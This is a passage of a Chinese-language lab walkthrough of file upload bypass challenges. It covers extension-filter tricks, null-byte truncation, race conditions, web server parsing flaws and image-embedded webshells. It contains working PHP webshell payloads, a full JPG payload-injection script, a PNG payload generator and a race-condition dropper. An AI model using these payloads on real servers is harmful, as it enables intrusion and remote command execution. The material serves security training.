&#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 可以看到在第五关代码中没有这个 1$file_ext = strtolower($file_ext); //转换为小写 所以我们可以通过大小写进行绕过了： 抓包： 回显： Pass-06 空格绕过——Windows源码如下： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这一关比第五关少了这样的一句代码 1$file_ext = trim($file_ext); //首尾去空 所以可以后缀名+空格的形式去绕过,抓包 修改： Pass-07 点绕过——Windows源码如下： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 查看代码发现，大小写，空格，等等都是绕不过的，但是还有一个在后缀名中家点号没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，上传后文件名后缀的点会被去除，所以可在后缀名中加”.”绕过，走起： Pass-08 ::$DATA绕过——Windows这一题的代码比上一次少了下面这一段代码 1$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 这个是关于windows下文件的流特性，可以参考一下这篇文章https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream在后缀添加::$DATA 即可绕过上传1.php::$DATA之后会变成1.php NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。 上传xxx.php::$DATA绕过。(仅限windows) Pass-09 点空格点绕过——Windows这一关像是前几关的组合拳，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字一样 1234567$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 可以遵循着他的步骤去实现自己的payload，可以设置为pass09.php. . 这样一来检测到最后的文件名是pass09.php.，这样就相当于第七关了 Pass-10 双写绕过12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 关键函数解析123456str_ireplace(find,replace,string,count)参数 描述find 必需。规定要查找的值。replace 必需。规定替换 find 中的值的值。string 必需。规定被搜索的字符串。count 可选。一个变量，对替换数进行计数。 上面的代码依旧是黑名单过滤，这里是将文件后缀名替换为空，只替换了一次 1234567&lt;?php$deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");$file_name = str_ireplace($deny_ext,\"\", 'pphphp');var_dump($file_name);#绕过测试代码?&gt; Pass-11 00截断GET方式123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 关键函数解析1234567891011121314strrpos()定义和用法strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。注释：strrpos() 函数对大小写敏感。相关函数：stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）语法strrpos(string,find,start)参数 描述string 必需。规定被搜索的字符串。find 必需。规定要查找的字符。start 可选。规定在何处开始搜索。 1234567substr()这里写代码片语法substr(string,start,length)参数 描述string 必需。规定要返回其中一部分的字符串。start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始 负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 test: 123456&lt;?php$a = '1.jpg';$file_ext = substr($a,strrpos($a,\".\")+1);var_dump($file_ext);?&gt;返回jpg 分析代码： 1$img_path = $_GET['save_path'].\"/\".rand(10,99).date(\"YmdHis\").\".\".$file_ext; 发现那个路径没有处理直接拼接上去的。所以可以利用00截断绕过。但是发现怎么截断都没有用。查阅资料： 123截断条件： php版本小于5.3.4 详情关注CVE-2006-7243 php的magic_quotes_gpc为OFF状态 解决后，抓包 请求中会自动将%00进行url解码，在后台进行拼凑的时候会自动阶段后面的字符串上传成功后的文件名即为你修改的名 Pass-12 00截断POST方式123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传失败\"; &#125; &#125; else &#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 该题也是00截断，只不过由于文件路径这个参数是通过post请求发送的，需要抓包后再hex中修改，因为post不会像get对%00进行自动解码 1$img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; save_path 从 GET 变成了 POST, 此时不能再使用 %00 截断, 原因是 %00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.这里把 2b(‘+’的 hex) 修改成 00 或者把 20(‘空格’的hex)修改为00 这里的路径 1.php+或1.php 都可 需自己手动加上 完成发送即可上传 Pass-13 图片马通过上传图片马，再利用本地包含漏洞执行 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 发现主要是取上传文件的头两个字节判断文件类型，因此直接上传图片马即可图片马制作方法,cmd中执行： 123copy one.jpg /b + one.php /a one.jpg/b:指定二进制格式复制、合并文件，用于图像或者声音类文件/a:指定以ascii格式复制、合并文件，用于txt等文本累文件 或 利用16进制编辑器在图片的编辑栏末尾加上木马 成功上传，而且得到文件的名称。我们后期如果存在文件包含漏洞就可以利用 比如我们简单写一个存在文件包含漏洞的页面: 123456&lt;?php$file = $_GET[ 'page' ];include($file);?&gt; 发现可以成功利用漏洞： Pass-14 图片马getimagsize函数12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 关键代码： 1234$types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); 这里用getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过， 知识补充点：1234array getimagesize ( string $filename [, array &amp;$imageinfo ] )getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 同样用上一关的图片木马进行上传也可成功利用方式和上一关一样，需要文件包含漏洞 Pass-15 图片马php_exif本关还是要上传一个图片马，这里用到php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过就不多说。 Pass-16 图片马二次渲染因为上传显示的的图片是二次渲染后生成的新图片，所以之前插入在图片中的代码会被过滤掉，因此上述的图片马无法实现 不同图片不同的绕过方法： gif：先把gif上传后，取出该文件与未修改的文件进行对比 蓝色部分内容为未改变的部分，因此可在蓝色部分中插入木马上传绕过 再上传 被修改的内容未被过滤，成功绕过，再结合文件包含漏洞 jpg：过于复杂，利用脚本处理得到上传图片： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"&lt;?php eval($_POST['DD']); ?&gt;\";//插入的恶意代码 if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) &#123; die('php-gd is not installed'); &#125; if(!isset($argv[1])) &#123; die('php jpg_payload.php &lt;jpg_name.jpg&gt;'); &#125; set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die('Incorrect SOI marker'); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage('payload_'.$argv[1], $outStream)) &#123; die('Success!'); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = ''; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die('End Of File'); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die('End Of File'); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 但有一些jpg图片不能被处理,所以要多尝试一些jpg图片使用脚本处理1.jpg 得到 用16进制编辑器查看 生成的图片中已插入php代码上传该图片码后，插入的php代码未被过滤 png:同样使用脚本处理图片: 123456789101112131415161718192021222324&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,'./1.png');?&gt; 得到 16进制编辑器查看 php代码已插入代码的使用：url： post: 相当于执行命令system(ipconfig) 本关还是要上传一个图片马。 1234567imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。该系列函数有：imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像 Pass-17 条件竞争1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 在if判读不通过unlink文件之前已经用move_uploaded_file函数将文件上传到upload目录下，所以通过bp不断的上传weshell，然后在浏览器中不断的访问总能访问到未被unlink的webshell文件 这里可以使用burp去发包， 即用Burp不断上传，再用burp不断访问 ，在burp中不断发送上传webshell的数据包，可以把文件内容改成下面这样 （就是为了写文件进去就对了） 1234&lt;?php$c=fopen('./cmd.php','w');fwrite($c,'&lt;?php system($_GET[\"f\"]);?&gt;');?&gt; 跑了之后， 就会在该文件夹下面产生新的文件了 访问 Pass18 条件竞争图片马1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192//index.php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; &#125;&#125;//myupload.phpclass MyUpload&#123; var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" ); /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( \"SUCCESS\" ); &#125;&#125;; 对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功 Pass-19 00截断POST方式与12题同样的方式 Pass-20 数组加/.绕过123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file']))&#123; //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type))&#123; $msg = \"禁止上传该类型文件!\"; &#125;else&#123; //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); &#125; $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) &#123; $msg = \"禁止上传该后缀文件!\"; &#125;else&#123; $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = \"文件上传成功！\"; $is_upload = true; &#125; else &#123; $msg = \"文件上传失败！\"; &#125; &#125; &#125;&#125;else&#123; $msg = \"请选择要上传的文件！\";&#125; 首先end函数取所post参数数组中的最后一个值，$file_name = reset($file) . ‘.’ . $file[count($file) - 1]我们可以post一个参数名为一个[0]一个[2]，然后$file[count($file) - 1]就为空，$file_name最终就为reset($file)即$file[0]，就可以绕过判断 抓包： 文件类型修改为图片类型： 漏洞利用： 上传成功： 看了其他大佬的总结，还有其他的一些未见过的解析漏洞IIS 6.0IIS 6.0解析利用又三种： 1.目录解析建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析 2.文件解析后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名) 3.默认解析IIS6.0 默认的可执行文件除了asp还包含这三种 1234/xxx.asa/xxx.cer/xxx.cdx/xxx.apsx IIS 7.0/7.5在正常图片URL后添加 /.php，可以解析为php Apache一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全 后缀解析：test.php.x1.x2.x3Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析test.php.x1.x2.x3则会被解析为php NginxNginx &lt;8.03畸形解析漏洞直接在正常图片URL后添加/.phpNginx &lt;=0.8.37在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞 在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件","categories":[],"tags":[]}]}